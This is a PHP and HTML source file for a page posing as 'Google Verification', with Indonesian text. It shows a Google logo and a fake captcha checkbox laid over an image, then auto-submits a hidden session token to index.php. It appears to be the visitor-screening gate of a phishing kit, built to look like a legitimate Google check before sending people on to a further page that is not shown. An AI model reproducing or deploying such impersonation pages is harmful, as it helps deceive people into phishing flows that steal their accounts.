<?php
function gcodeGenerateSession($length = 5) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $token = '';
    $maxRandIndex = strlen($characters) - 1;

    for ($i = 0; $i < $length; $i++) {
        $token .= $characters[random_int(0, $maxRandIndex)];
    }

    return $token;
}

function saveSessionToken($token) {
    $_SESSION['secToken'] = $token;
}

function getSessionToken() {
    if (isset($_SESSION['secToken'])) {
        return $_SESSION['secToken'];
    }
    return null;
}

function validateSessionToken($token) {
    if ($token === getSessionToken()) {
        return true;
    }
    return false;
}

session_start();
if (!isset($_SESSION['userAgent']) || $_SESSION['userAgent'] !== $_SERVER['HTTP_USER_AGENT']) {
    session_regenerate_id(true);
    $_SESSION['userAgent'] = $_SERVER['HTTP_USER_AGENT'];
}

if (!isset($_SESSION['secToken'])) {
    $securityToken = gcodeGenerateSession(5);
    saveSessionToken($securityToken);
} else {
    $securityToken = getSessionToken();
}

if (isset($_POST['gcodeToken'])) {
    $gcodeToken = $_POST['gcodeToken'];

    if (validateSessionToken($gcodeToken)) {
        echo "<form id='gcodeSub' method='POST' action='index.php?gToken=verified'>
        <input type='hidden' name='sessionToken' value='well'>
        </form>
        <script type='text/javascript'>document.getElementById('gcodeSub').submit();</script>";
    } else {
        echo "<script>alert('Sandi yang Anda masukkan salah!'); window.location='verify.php';</script>";
    }
}
?>
<!doctype html>
        <html lang="en">

        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
            <meta property="og:title" content="Google Verification" />
            <meta property="og:type" content="website">
            <link rel="stylesheet" href="assets/style.css">
            <title>Google Verification</title>
        </head>
 <style>
 .container {
  max-width: 450px;
  margin-left: auto;
        margin-right: auto;
  
}

.container .row .gam img {
  width: 80px;
  height: auto;
  margin-top: 30px;
  border-radius: 50px;
  margin-left: auto;
        margin-right: auto;
}

.container .row .p1 h3 {
  margin-top: 15px;
  font-size: 20px;
  font-weight: bold;
  color: #000
  margin-left: auto;
        margin-right: auto;
}

.container .row .button .btn {
  margin-top: 10px;
  width: 100%;
  padding-top: 8px;
  padding-bottom: 8px;
  border-radius: 10px;
  background-color: rgb(0, 0, 0);
  border-color: rgb(0, 0, 0);
  color: rgb(255, 255, 255);
  box-shadow: 1px 7px 10px rgb(198, 198, 198);
}
.box-verif {
background-color: #fff;
            border-radius: 5px;
            padding: 15px;
            box-shadow: 0 0 100px rgba(0, 0, 0, 0.1);
            text-align: 500px;
            color: #333;
            width: 250px;
}
.me-1 {
  width: 25px;
  height: 25px;
}
.btn-login-fb {
        background: #1778f2;
        width: 70%;
        height: auto;
        margin-top: 10px;
        margin-left: auto;
        margin-right: auto;
        padding: 10px;
        color: #fff;
        font-size: 14px;
        font-family: system-ui;
        font-weight: bold;
        text-align: center;
        text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
        border: 1px solid #3578e5;
        border-radius: 20px;
        box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
        outline: none;
        display: block;
    }
  .btn-login-fb:hover {
  border: none;
  color: white;
}
</style>
    <script>
        // Fungsi untuk menampilkan elemen berdasarkan pilihan
        function showElement(elementId) {
            // Semua elemen dengan class "hidden" disembunyikan
            var hiddenElements = document.querySelectorAll('.hidden');
            hiddenElements.forEach(function (elem) {
                elem.style.display = 'none';
            });

            // Tampilkan elemen berdasarkan pilihan
            var selectedElement = document.getElementById(elementId);
            selectedElement.style.display = 'block';
        }
    </script>
        <body>
            <div class="container">
                <div class="row">
                    <center>
                        <div class="gam">
                            <img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-1024.png" alt="">
                        </div>
                        <div class="p1">
                            <h3>Google Verification</h3>
                            <p style="margin-left:auto;margin-right:auto;">⬇⬇⬇⬇</p>
                        <form method="POST">
                        <input type="hidden" name="gcodeToken" class="form-control" placeholder="Password" value="<?=$_SESSION['secToken'];?>" required>
    </div>
                        <img style="margin-right:30px;margin-left: auto;margin-right: auto;" width="300" src="gcode/box-cpc.png" alt="">
                        <div style="margin-top:-53px;margin-right:240px;">
                        <input class="me-1" "form-check-input" type="checkbox" id="gcodeCheck" required>
                        </div>
                        <button style="margin-top:50px" class="btn-login-fb" type="submit">Lanjutkan</button>
                        </form>
                    </center>
                </div>
            </div>
    <script>
    const myCheckbox = document.getElementById('myCheckbox');
    const myButton = document.getElementById('myButton');

    myCheckbox.addEventListener('change', function() {
      if (myCheckbox.checked) {
        myButton.disabled = false;
      } else {
        myButton.disabled = true;
      }
    });
  </script>
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
        </body>

        </html>